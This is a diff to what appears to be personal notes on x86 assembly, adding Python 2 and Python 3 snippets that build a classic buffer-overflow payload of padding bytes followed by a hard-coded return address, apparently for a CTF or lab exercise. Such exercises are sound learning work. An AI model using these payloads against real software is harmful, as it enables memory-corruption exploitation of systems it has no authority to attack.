@@ -20,3 +20,20 @@ mov (or movb, movl, movw, movq)
 lea
 cmpl
 ```
+
+# python2
+```python
+a = ""
+for _ in range(10):
+    a += "A"
+print(a + '\x6b\x84\x04\x08')
+```
+
+# python3
+```python
+import sys
+
+length = 10
+payload = b"A" * length + b'\x6b\x84\x04\x08'
+sys.stdout.buffer.write(payload)
+```
